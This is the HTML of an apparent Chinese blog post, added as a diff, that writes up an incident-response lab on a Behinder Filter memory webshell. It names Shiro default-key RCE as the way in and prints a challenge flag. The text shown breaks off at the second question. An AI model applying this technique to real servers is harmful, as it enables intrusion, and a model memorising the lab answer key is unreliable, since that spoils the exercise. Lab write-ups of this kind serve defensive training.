@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>内存马分析-冰蝎内存马(Filter) - xia0le&#39;s Blog</title><meta name="author" content="xia0le">
+<meta name="description" content="内存马分析-冰蝎内存马(Filter) "><meta name="keywords" content='应急响应, 玄机, 内存马应急'>
+  <meta itemprop="name" content="内存马分析-冰蝎内存马(Filter)">
+  <meta itemprop="description" content="内存马分析-冰蝎内存马(Filter)">
+  <meta itemprop="datePublished" content="2025-06-14T19:00:44+08:00">
+  <meta itemprop="dateModified" content="2025-06-14T19:00:44+08:00">
+  <meta itemprop="wordCount" content="1324">
+  <meta itemprop="keywords" content="应急响应,玄机,内存马应急"><meta property="og:url" content="http://localhost:1313/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/">
+  <meta property="og:site_name" content="xia0le&#39;s Blog">
+  <meta property="og:title" content="内存马分析-冰蝎内存马(Filter)">
+  <meta property="og:description" content="内存马分析-冰蝎内存马(Filter)">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-14T19:00:44+08:00">
+    <meta property="article:modified_time" content="2025-06-14T19:00:44+08:00">
+    <meta property="article:tag" content="应急响应">
+    <meta property="article:tag" content="玄机">
+    <meta property="article:tag" content="内存马应急">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="内存马分析-冰蝎内存马(Filter)">
+  <meta name="twitter:description" content="内存马分析-冰蝎内存马(Filter)">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/" title="内存马分析-冰蝎内存马(Filter) - xia0le&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/cobaltstrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="CobaltStrike流量分析" /><link rel="next" type="text/html" href="http://localhost:1313/posts/%E4%BE%9B%E5%BA%94%E9%93%BE%E5%BA%94%E6%80%A5-part3/" title="供应链应急-Part3" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "内存马分析-冰蝎内存马(Filter)",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter\/"
+    },"genre": "posts","keywords": "应急响应, 玄机, 内存马应急","wordcount":  1324 ,
+    "url": "http:\/\/localhost:1313\/posts\/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter\/","datePublished": "2025-06-14T19:00:44+08:00","dateModified": "2025-06-14T19:00:44+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "xia0le"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="xia0le&#39;s Blog"><span class="header-title-text">xia0le&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="xia0le&#39;s Blog"><span class="header-title-text">xia0le&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>内存马分析-冰蝎内存马(Filter)</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      xia0le</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="post-category" title="Category - 应急响应"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 应急响应</a></span></div><div class="post-meta-line"><span title="published on 2025-06-14 19:00:44"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-06-14">2025-06-14</time></span>&nbsp;<span title="1324 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#题目名内存马分析-冰蝎内存马">题目名：内存马分析-冰蝎内存马</a></li>
+    <li><a href="#难度中阶">难度：中阶</a></li>
+    <li><a href="#连接信息">连接信息：</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#冰蝎filter内存马分析">冰蝎Filter内存马分析</a></li>
+    <li><a href="#shiro流量分析">shiro流量分析</a></li>
+    <li><a href="#内存马清除java热加载">内存马清除(java热加载)</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#1攻击复现提交服务器根目录下的flag值">1.【攻击复现】提交服务器根目录下的flag值</a></li>
+    <li><a href="#2应急响应排查出黑客留下的后门提交完整包名">2.【应急响应】排查出黑客留下的后门，提交完整包名</a></li>
+    <li><a href="#3应急响应排查出黑客留下的后门提交后门路径">3.【应急响应】排查出黑客留下的后门，提交后门路径</a></li>
+    <li><a href="#4应急响应排查出黑客留下的后门提交密码">4.【应急响应】排查出黑客留下的后门，提交密码</a></li>
+    <li><a href="#5安全加固修复后门后访问web-check页面拿到flag提交">5.【安全加固】修复后门后访问web-check页面拿到flag提交</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="内存马分析-冰蝎内存马filter" class="heading-element"><span>内存马分析-冰蝎内存马(Filter)</span>
+  <a href="#%e5%86%85%e5%ad%98%e9%a9%ac%e5%88%86%e6%9e%90-%e5%86%b0%e8%9d%8e%e5%86%85%e5%ad%98%e9%a9%acfilter" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="题目信息" class="heading-element"><span>题目信息</span>
+  <a href="#%e9%a2%98%e7%9b%ae%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="题目名内存马分析-冰蝎内存马" class="heading-element"><span>题目名：内存马分析-冰蝎内存马</span>
+  <a href="#%e9%a2%98%e7%9b%ae%e5%90%8d%e5%86%85%e5%ad%98%e9%a9%ac%e5%88%86%e6%9e%90-%e5%86%b0%e8%9d%8e%e5%86%85%e5%ad%98%e9%a9%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="难度中阶" class="heading-element"><span>难度：中阶</span>
+  <a href="#%e9%9a%be%e5%ba%a6%e4%b8%ad%e9%98%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="连接信息" class="heading-element"><span>连接信息：</span>
+  <a href="#%e8%bf%9e%e6%8e%a5%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>不提供需渗透进入</p>
+<h2 id="题目简介" class="heading-element"><span>题目简介</span>
+  <a href="#%e9%a2%98%e7%9b%ae%e7%ae%80%e4%bb%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>再一次HW项目中集团登录页面被植入木马，黑客正在连接，请你协助排查</p>
+<p>web-check：ip:5001</p>
+<h2 id="解题步骤" class="heading-element"><span>解题步骤</span>
+  <a href="#%e8%a7%a3%e9%a2%98%e6%ad%a5%e9%aa%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="知识点" class="heading-element"><span>知识点</span>
+  <a href="#%e7%9f%a5%e8%af%86%e7%82%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="冰蝎filter内存马分析" class="heading-element"><span>冰蝎Filter内存马分析</span>
+  <a href="#%e5%86%b0%e8%9d%8efilter%e5%86%85%e5%ad%98%e9%a9%ac%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="shiro流量分析" class="heading-element"><span>shiro流量分析</span>
+  <a href="#shiro%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="内存马清除java热加载" class="heading-element"><span>内存马清除(java热加载)</span>
+  <a href="#%e5%86%85%e5%ad%98%e9%a9%ac%e6%b8%85%e9%99%a4java%e7%83%ad%e5%8a%a0%e8%bd%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="题目" class="heading-element"><span>题目</span>
+  <a href="#%e9%a2%98%e7%9b%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="1攻击复现提交服务器根目录下的flag值" class="heading-element"><span>1.【攻击复现】提交服务器根目录下的flag值</span>
+  <a href="#1%e6%94%bb%e5%87%bb%e5%a4%8d%e7%8e%b0%e6%8f%90%e4%ba%a4%e6%9c%8d%e5%8a%a1%e5%99%a8%e6%a0%b9%e7%9b%ae%e5%bd%95%e4%b8%8b%e7%9a%84flag%e5%80%bc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>直接shiro默认密钥RCE</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">flag</span><span class="p">{</span><span class="nx">ef7efd2ae29edaf396abafe3f7c1556a</span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746686088956-20250508143450-ffenqyk.png" alt="QQ_1746686088956" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746686088956-20250508143450-ffenqyk.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746686088956-20250508143450-ffenqyk.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746686088956-20250508143450-ffenqyk.png?size=large 2x" data-title="QQ_1746686088956" style="--width: 2000px;--aspect-ratio: 2000 / 1656;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746686066778-20250508143439-kfiqmxh.png" alt="QQ_1746686066778" srcset="/posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746686066778-20250508143439-kfiqmxh.png?size=small, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746686066778-20250508143439-kfiqmxh.png?size=medium 1.5x, /posts/%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-%E5%86%B0%E8%9D%8E%E5%86%85%E5%AD%98%E9%A9%ACfilter/images/QQ_1746686066778-20250508143439-kfiqmxh.png?size=large 2x" data-title="QQ_1746686066778" style="--width: 3456px;--aspect-ratio: 3456 / 2058;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="2应急响应排查出黑客留下的后门提交完整包名" class="heading-element"><span>2.【应急响应】排查出黑客留下的后门，提交完整包名</span>
+  <a href="#2%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94%e6%8e%92%e6%9f%a5%e5%87%ba%e9%bb%91%e5%ae%a2%e7%95%99%e4%b8%8b%e7%9a%84%e5%90%8e%e9%97%a8%e6%8f%90%e4%ba%a4%e5%ae%8c%e6%95%b4%e5%8c%85%e5%90%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
